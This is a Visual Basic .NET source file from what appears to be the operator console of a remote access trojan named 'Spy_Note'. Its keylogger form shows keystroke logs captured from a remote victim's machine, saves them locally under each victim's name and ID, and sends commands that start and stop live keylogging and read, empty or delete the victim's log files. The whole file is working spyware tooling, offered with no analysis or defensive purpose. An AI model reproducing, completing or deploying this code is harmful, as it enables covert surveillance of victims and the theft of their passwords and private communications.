Imports System.Text
Imports Microsoft.VisualBasic.CompilerServices
Imports Spy_Note.etonyps

Public Class key_logger
    Public handle_Number_Client As Integer
    Public Client_remote_Address As String
    Public Name_Client As String
    Public Client_ID As String
    Public Sub Client_data(data As String)
        Try
            Dim flag As Boolean = data <> Nothing
            If flag Then
                Dim flag2 As Boolean = data.Contains("[My/Exception]") And data.StartsWith("[My/Exception]")
                If flag2 Then
                    Dim separator As String() = New String() {"[My/Exception]"}
                    Dim array As String() = data.Split(separator, StringSplitOptions.RemoveEmptyEntries)
                    Me.Label1.Text = array(0)
                    Dim flag3 As Boolean = Operators.CompareString(array(0), "Can not access", False) = 0
                    If flag3 Then
                        Me.Panel1.Enabled = False
                        Me.Panel2.Enabled = False
                    End If
                    Dim flag4 As Boolean = Not Me.Panel3.Visible
                    If flag4 Then
                        Me.Panel3.Visible = True
                    End If
                Else
                    Dim separator2 As String() = New String() {My.Forms.Form1.s.split_Ary}
                    Dim array2 As String() = data.Split(separator2, StringSplitOptions.RemoveEmptyEntries)
                    Dim left As String = array2(0)
                    If Operators.CompareString(left, "offline", False) <> 0 Then
                        If Operators.CompareString(left, "online", False) <> 0 Then
                            If Operators.CompareString(left, "start", False) = 0 Then
                                Dim separator3 As String() = New String() {My.Forms.Form1.s.split_paths}
                                Dim array3 As String() = array2(1).Split(separator3, StringSplitOptions.RemoveEmptyEntries)
                                Me.ComboBox1.Items.Clear()
                                Dim num As Integer = array3.Length - 1
                                For i As Integer = 0 To num
                                    Dim flag5 As Boolean = array3(i).StartsWith("config") And array3(i).EndsWith(".log")
                                    If flag5 Then
                                        Me.ComboBox1.Items.Add(array3(i))
                                    End If
                                Next
                                Dim flag6 As Boolean = Me.ComboBox1.Items.Count > 0
                                If flag6 Then
                                    Me.ComboBox1.Text = Conversions.ToString(Me.ComboBox1.Items(Me.ComboBox1.Items.Count - 1))
                                End If
                            End If
                        Else
                            Dim flag7 As Boolean = array2.Length = 3
                            If flag7 Then
                                Dim stringBuilder As StringBuilder = New StringBuilder()
                                stringBuilder.Append(array2(1) + vbCrLf + array2(2) + vbCrLf)
                                Me.RichTextBox2.AppendText(stringBuilder.ToString())
                                Me.RichTextBox2.ScrollToCaret()
                            End If
                        End If
                    Else
                        Me.RichTextBox1.Text = Nothing
                        Dim stringBuilder2 As StringBuilder = New StringBuilder()
                        stringBuilder2.Append(data)
                        stringBuilder2 = stringBuilder2.Replace(My.Forms.Form1.s.split_Line, vbCrLf)
                        stringBuilder2 = stringBuilder2.Replace(My.Forms.Form1.s.split_Ary, vbCrLf)
                        Me.RichTextBox1.AppendText(stringBuilder2.ToString())
                        Me.RichTextBox1.ScrollToCaret()
                        store_0.Save_0(Me.Name_Client + Me.Client_ID + "\Keylogger", stringBuilder2.ToString())
                    End If
                    Dim visible As Boolean = Me.Panel3.Visible
                    If visible Then
                        Me.Panel3.Visible = False
                    End If
                End If
                Me.refres_title()
            End If
        Catch ex As Exception
        End Try
    End Sub

    Private Sub ComboBox1_MouseWheel(sender As Object, e As MouseEventArgs) Handles ComboBox1.MouseWheel
        Dim handledMouseEventArgs As HandledMouseEventArgs = CType(e, HandledMouseEventArgs)
        handledMouseEventArgs.Handled = True
    End Sub

    Private Sub ComboBox1_KeyPress(sender As Object, e As KeyPressEventArgs) Handles ComboBox1.KeyPress
        e.Handled = True
    End Sub

    Private Sub key_logger_Load(sender As Object, e As EventArgs) Handles Me.Load
        Me.RichTextBox1.ContextMenuStrip = store_0.ContextMenu1
        Me.RichTextBox2.ContextMenuStrip = store_0.ContextMenu1
        Me.refres_title()
        MyBase.Icon = store_0.icons_0("window")
        Me.TabPage1.Text = "Offline"
        Me.TabPage2.Text = "Online"
        Me.TabPage1.[Select]()
    End Sub

    Private Sub refres_title()
        Dim text As String = String.Format("Keylogger - Remote Address & Port: {0} Client Name: {1}", Me.Client_remote_Address, Me.Name_Client)
        Me.Text = text
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim flag As Boolean = Operators.CompareString(Me.ComboBox1.Text, Nothing, False) <> 0
        If flag Then
            My.Forms.Form1.s.Send(Me.handle_Number_Client, "key_logger_read" + My.Forms.Form1.s.SplitData + Me.ComboBox1.Text)
        End If
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim flag As Boolean = Operators.CompareString(Me.ComboBox1.Text, Nothing, False) <> 0
        If flag Then
            My.Forms.Form1.s.Send(Me.handle_Number_Client, "key_logger_emptying" + My.Forms.Form1.s.SplitData + Me.ComboBox1.Text)
        End If
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "key_logger_online_start" + My.Forms.Form1.s.SplitData)
        Me.Button4.Enabled = False
        Me.Button3.Enabled = True
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "key_logger_online_stop" + My.Forms.Form1.s.SplitData)
        Me.Button3.Enabled = False
        Me.Button4.Enabled = True
    End Sub

    Private Sub key_logger_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        My.Forms.Form1.s.Send(Me.handle_Number_Client, "key_logger_online_stop" + My.Forms.Form1.s.SplitData)
    End Sub

    Private Sub Button5_Click(sender As Object, e As EventArgs) Handles Button5.Click
        Try
            Dim flag As Boolean = Operators.CompareString(Me.ComboBox1.Text, Nothing, False) <> 0
            If flag Then
                My.Forms.Form1.s.Send(Me.handle_Number_Client, "key_logger_delete" + My.Forms.Form1.s.SplitData + Me.ComboBox1.Text)
                Dim selectedIndex As Integer = Me.ComboBox1.SelectedIndex
                Me.ComboBox1.Items.RemoveAt(selectedIndex)
                Dim flag2 As Boolean = Me.ComboBox1.Items.Count > 0
                If flag2 Then
                    Me.ComboBox1.Text = Conversions.ToString(Me.ComboBox1.Items(Me.ComboBox1.Items.Count - 1))
                Else
                    Me.ComboBox1.Text = Nothing
                End If
            End If
        Catch ex As Exception
        End Try
    End Sub
End Class